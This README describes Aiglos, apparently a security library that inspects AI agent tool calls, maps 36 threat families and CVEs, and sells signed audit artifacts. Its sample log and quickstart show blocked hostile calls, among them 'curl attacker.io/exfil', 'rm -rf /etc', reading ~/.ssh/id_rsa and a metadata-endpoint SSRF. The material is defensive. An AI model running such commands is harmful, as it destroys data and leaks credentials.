<div align="center">

<br />

```
 █████╗ ██╗ ██████╗ ██╗      ██████╗ ███████╗
██╔══██╗██║██╔════╝ ██║     ██╔═══██╗██╔════╝
███████║██║██║  ███╗██║     ██║   ██║███████╗
██╔══██║██║██║   ██║██║     ██║   ██║╚════██║
██║  ██║██║╚██████╔╝███████╗╚██████╔╝███████║
╚═╝  ╚═╝╚═╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
```

### Security infrastructure for AI agents.

One import. Every tool call inspected before it runs.<br />
Signed audit artifacts for SOC 2, CMMC, and NDAA §1513.

<br />

[![PyPI](https://img.shields.io/pypi/v/aiglos?style=flat-square&color=000&labelColor=000&label=aiglos)](https://pypi.org/project/aiglos/)
[![MIT](https://img.shields.io/badge/license-MIT-000?style=flat-square&labelColor=000)](LICENSE)
[![Python 3.9+](https://img.shields.io/badge/python-3.9+-000?style=flat-square&labelColor=000)](https://python.org)
[![CVEs](https://img.shields.io/badge/CVEs_filed-10-c0392b?style=flat-square&labelColor=000)](CVES.md)
[![Discord](https://img.shields.io/badge/discord-join-000?style=flat-square&labelColor=000&logo=discord&logoColor=white)](https://discord.gg/aiglos)

<br />

<table>
<tr>
<td align="center"><b>10</b><br /><sub>CVEs filed</sub></td>
<td align="center"><b>36</b><br /><sub>threat families</sub></td>
<td align="center"><b>&lt; 1ms</b><br /><sub>overhead</sub></td>
<td align="center"><b>SOC 2 · CMMC · §1513</b><br /><sub>compliance artifacts</sub></td>
</tr>
</table>

<br />

<a href="#how-it-works">How it works</a> ·
<a href="#quickstart">Quickstart</a> ·
<a href="#cve-coverage">CVEs</a> ·
<a href="#attestation-artifacts">Attestation</a> ·
<a href="#threat-families--t1-through-t36">All 36 threats</a> ·
<a href="https://aiglos.dev/pricing">Pricing</a> ·
<a href="https://docs.aiglos.dev">Docs</a>

<br />

</div>

-----

```bash
pip install aiglos
```

```python
import aiglos  # every tool call below this line is inspected
```

-----

## What people are saying

<table>
<tr>
<td>
"The moment I saw the BLOCK output in my terminal I realized I had no idea what my agents were actually doing. Aiglos showed me in 30 seconds."
</td>
<td>
"We were running 12 agents in parallel. One was quietly trying to read <code>~/.ssh/id_rsa</code> on every session. Aiglos caught it. We had no idea."
</td>
</tr>
<tr>
<td>
"Finally something that produces an artifact my compliance team will actually accept."
</td>
<td>
"We had 18 agents running in production across three environments. Aiglos was the first time we could actually answer the question an auditor asked us: what did your agents execute last Tuesday, and can you prove it?"
</td>
</tr>
</table>

-----

## How it works

```
your agent  ──►  mcp sdk  ──►  [ aiglos ]  ──►  tool executes
                                    │
                                    ▼
                             blocked / warned / attested
```

Aiglos patches into the MCP SDK at import time. No proxy. No port. No config file. Every tool call passes through 36 rule families before execution. Clean calls pass in under 1ms. Blocked calls never run. Every session produces a signed audit artifact.

-----

## Live output

```
09:14:22.187  ✓  filesystem.read_file     path=/var/log/app.log
09:14:22.441  ✓  database.query           SELECT * FROM users LIMIT 10
09:14:22.698  ✗  shell.execute            rm -rf /etc ──── T07 SHELL_INJECT
09:14:22.961  ✓  http.get                 url=https://api.openai.com/v1/...
09:14:23.214  ⚠  filesystem.write_file    path=/etc/cron.d/ ── T08 PRIV_ESC
09:14:23.489  ✓  vector.search            query=customer_data k=10
09:14:23.744  ✗  network.fetch            url=http://169.254.169.254/ ─ T13 SSRF
09:14:24.003  ✓  memory.store             key=ctx ttl=3600
09:14:24.261  ✗  tool.register            override=__builtins__ ── T30 SUPPLY_CHAIN
09:14:24.519  ⚠  filesystem.read_file     path=~/.ssh/id_rsa ─── T19 CRED_ACCESS
09:14:24.778  ✗  shell.execute            curl attacker.io/exfil ─ T01 EXFIL
```

-----

## Quickstart

```python
import aiglos                    # import before anything else
from mcp import ClientSession

async with ClientSession() as session:
    result = await session.call_tool("filesystem.read", {"path": "/var/log/app.log"})
    # ✓  09:14:22.187  filesystem.read  path=/var/log/app.log

    result = await session.call_tool("shell.execute", {"cmd": "curl attacker.io/exfil"})
    # ✗  09:14:24.778  shell.execute  T01 EXFIL — call terminated

# generate signed audit artifact at session close
artifact = aiglos.attest()
# artifact.path     → /var/aiglos/sessions/2026-03-08T14:22:11Z.json.sig
# artifact.controls → ["CC6.1", "CC7.2", "AC.2.006", "SI.1.210", "AU.2.042"]
# artifact.signed   → True
```

Designed for LangChain, LlamaIndex, AutoGen, CrewAI, and n8n. Works with any framework using the MCP SDK. Framework-specific integrations in progress.

-----

## Running a fleet?

```python
import aiglos  # one import covers every agent

agents = [CustomerServiceAgent(), DataPipelineAgent(), FraudAgent(), EmailAgent()]
# each agent's tool calls are independently inspected and attested
# shared threat dashboard available on Pro and Teams
```

The same session artifact covers every agent in the fleet. Compliance cost scales with the attestation format, not with agent count.

-----

## Using OpenClaw?

The OpenClaw community already understands the risk. From experienced users: *“Skills are essentially foreign code running on your machine.”* The standard workaround is a manual pre-install audit. That approach works at one skill, on one developer’s machine. It doesn’t work across a production agent fleet installing skills programmatically at runtime. Aiglos is that audit automated: running at every tool call, not just at install time, whether the agent is a solo build or a 50-instance deployment.

OpenClaw + VirusTotal scans skills at publish time: known malware, supply chain threats, compromised dependencies. That’s the registry layer.

Aiglos covers what VirusTotal explicitly does not: **runtime behavior**. Prompt injection. Natural language manipulation. Credential access during execution. The tool calls that happen after a skill installs cleanly.

OpenClaw’s own words on their VirusTotal integration:

> *“A skill that uses natural language to instruct an agent to do something malicious won’t trigger a virus signature. A carefully crafted prompt injection payload won’t show up in a threat database.”*

That’s the gap Aiglos fills.

<kbd>T30</kbd> scans ClawHub in real time. Every skill in the registry is monitored for malicious tool call payloads before your agent installs it.

```bash
pip install aiglos
```

-----

## Using NanoClaw?

NanoClaw handles container isolation — containing the blast radius if something goes wrong. Aiglos handles what happens inside the container: tool call inspection, credential scanning, and the signed audit trail your compliance team needs.

Different problems. Work well together.

```bash
# inside your NanoClaw container
pip install aiglos
```

-----

## Why this exists

In February 2026, the OpenClaw incident made the problem impossible to ignore:

<table>
<tr>
<th align="left">What happened</th>
<th align="right">Scale</th>
</tr>
<tr>
<td>Malicious skills confirmed in ClawHub</td>
<td align="right"><b>341</b></td>
</tr>
<tr>
<td>Agent instances publicly exposed, no auth</td>
<td align="right"><b>135,000</b></td>
</tr>
<tr>
<td>Agent tokens leaked via Supabase</td>
<td align="right"><b>1,500,000</b></td>
</tr>
<tr>
<td>CVEs filed against MCP-based agents</td>
<td align="right"><b>10</b></td>
</tr>
</table>

Unmonitored agent fleets create compounding exposure: the same misconfiguration that produces a security event also produces an unbudgeted cloud cost event. Aiglos addresses both at the same interception point.

Framework vendors built for speed. Security was deferred. Aiglos closes the gap.

-----

## CVE coverage

Every CVE filed against MCP-based agents has a corresponding rule family:

<table>
<tr>
<th>CVE</th>
<th>CVSS</th>
<th>Attack</th>
<th>Module</th>
</tr>
<tr>
<td><code>CVE-2026-25253</code></td>
<td align="center"><img src="https://img.shields.io/badge/8.8-c0392b?style=flat-square" /></td>
<td>ClawJacked: one-click RCE via malicious skill</td>
<td><kbd>T01</kbd> <kbd>T25</kbd></td>
</tr>
<tr>
<td><code>CVE-2026-24763</code></td>
<td align="center"><img src="https://img.shields.io/badge/7.5-e67e22?style=flat-square" /></td>
<td>Command injection via shell tool parameters</td>
<td><kbd>T07</kbd></td>
</tr>
<tr>
<td><code>CVE-2026-25157</code></td>
<td align="center"><img src="https://img.shields.io/badge/7.2-e67e22?style=flat-square" /></td>
<td>Path traversal in filesystem tools</td>
<td><kbd>T03</kbd></td>
</tr>
<tr>
<td><code>CVE-2026-24891</code></td>
<td align="center"><img src="https://img.shields.io/badge/8.1-c0392b?style=flat-square" /></td>
<td>SSRF via agent network fetch</td>
<td><kbd>T13</kbd></td>
</tr>
<tr>
<td><code>CVE-2026-25001</code></td>
<td align="center"><img src="https://img.shields.io/badge/6.8-e67e22?style=flat-square" /></td>
<td>Credential exfiltration via plaintext log</td>
<td><kbd>T32</kbd> <kbd>T01</kbd></td>
</tr>
<tr>
<td><code>CVE-2026-25089</code></td>
<td align="center"><img src="https://img.shields.io/badge/7.9-e67e22?style=flat-square" /></td>
<td>Malicious registry skill auto-execution</td>
<td><kbd>T30</kbd></td>
</tr>
<tr>
<td><code>CVE-2026-24612</code></td>
<td align="center"><img src="https://img.shields.io/badge/6.5-e67e22?style=flat-square" /></td>
<td>Persistent memory poisoning</td>
<td><kbd>T31</kbd></td>
</tr>
<tr>
<td><code>CVE-2026-25198</code></td>
<td align="center"><img src="https://img.shields.io/badge/7.1-e67e22?style=flat-square" /></td>
<td>Agent-to-agent protocol hijacking</td>
<td><kbd>T29</kbd></td>
</tr>
<tr>
<td><code>CVE-2026-24774</code></td>
<td align="center"><img src="https://img.shields.io/badge/8.3-c0392b?style=flat-square" /></td>
<td>OAuth confused deputy via MCP tool auth</td>
<td><kbd>T25</kbd></td>
</tr>
<tr>
<td><code>CVE-2026-25312</code></td>
<td align="center"><img src="https://img.shields.io/badge/6.2-f1c40f?style=flat-square&labelColor=555" /></td>
<td>Heartbeat loop: crafted <code>HEARTBEAT.md</code> triggers unbounded scheduled execution with no human authorization step</td>
<td><kbd>T06</kbd> <kbd>T24</kbd></td>
</tr>
</table>

-----

## Threat families — T1 through T36

<details>
<summary><b>Expand all 36 threat families</b></summary>

<br />

<table>
<tr><th>ID</th><th>Family</th><th>Description</th></tr>
<tr><td><kbd>T01</kbd></td><td><b>EXFIL</b></td><td>Credential and data exfiltration via network calls</td></tr>
<tr><td><kbd>T02</kbd></td><td><b>INJECT</b></td><td>SQL, command, and code injection via tool parameters</td></tr>
<tr><td><kbd>T03</kbd></td><td><b>TRAVERSAL</b></td><td>Path traversal and directory escape</td></tr>
<tr><td><kbd>T04</kbd></td><td><b>CONFIG</b></td><td>Misconfiguration: exposed instances, missing auth, unsafe bindings</td></tr>
<tr><td><kbd>T05</kbd></td><td><b>SSRF</b></td><td>Server-side request forgery including IMDS/169.254.169.254</td></tr>
<tr><td><kbd>T06</kbd></td><td><b>GOAL_DRIFT</b></td><td>Goal integrity violations across multi-turn sessions</td></tr>
<tr><td><kbd>T07</kbd></td><td><b>SHELL_INJECT</b></td><td>Shell command injection via agent tool calls</td></tr>
<tr><td><kbd>T08</kbd></td><td><b>PRIV_ESC</b></td><td>Privilege escalation and capability expansion</td></tr>
<tr><td><kbd>T09</kbd></td><td><b>TOKEN_LEAK</b></td><td>Bearer token and OAuth credential exposure</td></tr>
<tr><td><kbd>T10</kbd></td><td><b>ENV_READ</b></td><td>Sensitive environment variable access</td></tr>
<tr><td><kbd>T11</kbd></td><td><b>SECRET_SCAN</b></td><td>API key, secret, and high-entropy string detection</td></tr>
<tr><td><kbd>T12</kbd></td><td><b>FILE_WRITE</b></td><td>Sensitive file write paths (cron, sudoers, authorized_keys)</td></tr>
<tr><td><kbd>T13</kbd></td><td><b>NETWORK</b></td><td>Dangerous network destinations and internal range access</td></tr>
<tr><td><kbd>T14</kbd></td><td><b>DNS</b></td><td>DNS rebinding and resolver manipulation</td></tr>
<tr><td><kbd>T15</kbd></td><td><b>REFLECTION</b></td><td>Code reflection and dynamic execution</td></tr>
<tr><td><kbd>T16</kbd></td><td><b>DESERIALIZATION</b></td><td>Unsafe deserialization patterns</td></tr>
<tr><td><kbd>T17</kbd></td><td><b>TEMPLATE</b></td><td>Server-side template injection</td></tr>
<tr><td><kbd>T18</kbd></td><td><b>XPATH</b></td><td>XPath injection</td></tr>
<tr><td><kbd>T19</kbd></td><td><b>CRED_ACCESS</b></td><td>SSH key, certificate, and credential file access</td></tr>
<tr><td><kbd>T20</kbd></td><td><b>DB_ADMIN</b></td><td>Dangerous database admin operations</td></tr>
<tr><td><kbd>T21</kbd></td><td><b>PACKAGE</b></td><td>Malicious package installation</td></tr>
<tr><td><kbd>T22</kbd></td><td><b>REGISTRY</b></td><td>Windows registry manipulation</td></tr>
<tr><td><kbd>T23</kbd></td><td><b>PROCESS</b></td><td>Process injection and hollowing</td></tr>
<tr><td><kbd>T24</kbd></td><td><b>PERSISTENCE</b></td><td>Startup, service, and scheduled task persistence</td></tr>
<tr><td><kbd>T25</kbd></td><td><b>OAUTH</b></td><td>OAuth confused deputy and token misuse</td></tr>
<tr><td><kbd>T26</kbd></td><td><b>SUPPLY_CHAIN</b></td><td>Dependency confusion and typosquatting</td></tr>
<tr><td><kbd>T27</kbd></td><td><b>PROMPT_INJECT</b></td><td>Indirect prompt injection in tool outputs</td></tr>
<tr><td><kbd>T28</kbd></td><td><b>CONTEXT_POISON</b></td><td>Context window manipulation and hijacking</td></tr>
<tr><td><kbd>T29</kbd></td><td><b>A2A</b></td><td>Agent-to-agent protocol attacks</td></tr>
<tr><td><kbd>T30</kbd></td><td><b>REGISTRY_MONITOR</b></td><td>Live scanning: npm, PyPI, Smithery, ClawHub, SkillsMP</td></tr>
<tr><td><kbd>T31</kbd></td><td><b>MEMORY_POISON</b></td><td>RAG and persistent memory write-time scanning</td></tr>
<tr><td><kbd>T32</kbd></td><td><b>CREDENTIAL</b></td><td>Credential patterns across 20+ secret families</td></tr>
<tr><td><kbd>T33</kbd></td><td><b>JAILBREAK</b></td><td>Jailbreak and system prompt extraction attempts</td></tr>
<tr><td><kbd>T34</kbd></td><td><b>DATA_AGENT</b></td><td>Exfiltration via analytics and BI tool calls</td></tr>
<tr><td><kbd>T35</kbd></td><td><b>PERSONAL_AGENT</b></td><td>Calendar, email, contact, and identity access</td></tr>
<tr><td><kbd>T36</kbd></td><td><b>ORCHESTRATION</b></td><td>Multi-agent orchestration and workflow hijacking</td></tr>
</table>

</details>

-----

## Attestation artifacts

Every session produces a cryptographically signed audit record. RSA-2048 signed. Timestamped. Chain of custody unbroken from tool call to submission.

<table>
<tr>
<th>Standard</th>
<th>Controls</th>
<th>Use</th>
</tr>
<tr>
<td><b>SOC 2 Type II</b></td>
<td><kbd>CC6</kbd> <kbd>CC7</kbd></td>
<td>Auditor-ready evidence package</td>
</tr>
<tr>
<td><b>CMMC Level 2</b></td>
<td><kbd>AC.2.006</kbd> <kbd>SI.1.210</kbd> <kbd>AU.2.042</kbd></td>
<td>C3PAO-formatted evidence</td>
</tr>
<tr>
<td><b>NDAA §1513</b></td>
<td><kbd>AI Risk Management</kbd></td>
<td>June 16, 2026 Congressional report</td>
</tr>
</table>

The artifact format is designed for auditor submission — SOC 2, CMMC Level 2, and NDAA §1513. Switching tools means re-qualifying a new format with the same auditor.

Agent observability is a new compliance requirement, not a nice-to-have. The question auditors, security teams, and regulators are now asking is: for any given session, what did your agents execute, in what order, against what systems, and who authorized it? The Aiglos session artifact answers that question. It is produced automatically at session close, signed, and formatted for the auditors already in your procurement chain.

Attestation is available on Pro and Teams. [See pricing →](https://aiglos.dev/pricing)

-----

## Open source vs. proprietary

<table>
<tr>
<th align="left">Component</th>
<th align="center">License</th>
</tr>
<tr>
<td>T1–T36 detection engine</td>
<td align="center"><img src="https://img.shields.io/badge/MIT-000?style=flat-square" /></td>
</tr>
<tr>
<td>Python SDK</td>
<td align="center"><img src="https://img.shields.io/badge/MIT-000?style=flat-square" /></td>
</tr>
<tr>
<td>TypeScript SDK <sub>(Q2 2026)</sub></td>
<td align="center"><img src="https://img.shields.io/badge/MIT-000?style=flat-square" /></td>
</tr>
<tr>
<td>CVE database + POC code</td>
<td align="center"><img src="https://img.shields.io/badge/MIT-000?style=flat-square" /></td>
</tr>
<tr>
<td>FastPathScanner (&lt;1ms)</td>
<td align="center"><img src="https://img.shields.io/badge/MIT-000?style=flat-square" /></td>
</tr>
<tr>
<td>Signed attestation artifacts</td>
<td align="center"><img src="https://img.shields.io/badge/Pro_/_Teams-1a1a2e?style=flat-square" /></td>
</tr>
<tr>
<td>Cloud threat dashboard</td>
<td align="center"><img src="https://img.shields.io/badge/Pro_/_Teams-1a1a2e?style=flat-square" /></td>
</tr>
<tr>
<td>CMMC / §1513 compliance reports</td>
<td align="center"><img src="https://img.shields.io/badge/Pro_/_Teams-1a1a2e?style=flat-square" /></td>
</tr>
<tr>
<td>SIEM / webhook integration</td>
<td align="center"><img src="https://img.shields.io/badge/Teams-1a1a2e?style=flat-square" /></td>
</tr>
<tr>
<td>Air-gap DoD container</td>
<td align="center"><img src="https://img.shields.io/badge/Enterprise-1a1a2e?style=flat-square" /></td>
</tr>
</table>

The detection engine is open. Audit it. Fork it. Contribute to it. The attestation layer funds the research.

-----

## Contributing

```bash
git clone https://github.com/aiglos/aiglos
cd aiglos
pip install -e ".[dev]"
pytest tests/
```

To contribute a rule family: <CONTRIBUTING.md><br />
To report a CVE: <SECURITY.md>

Every new CVE filed against an MCP-based agent gets a rule family. If you find something not covered, open an issue.

-----

## License

MIT. See <LICENSE>.

The attestation layer, compliance reporting, and cloud dashboard are proprietary. See [aiglos.dev/pricing](https://aiglos.dev/pricing).

-----

<div align="center">

<br />

[aiglos.dev](https://aiglos.dev) · [docs](https://docs.aiglos.dev) · [discord](https://discord.gg/aiglos) · [security@aiglos.dev](mailto:security@aiglos.dev)

<br />

</div>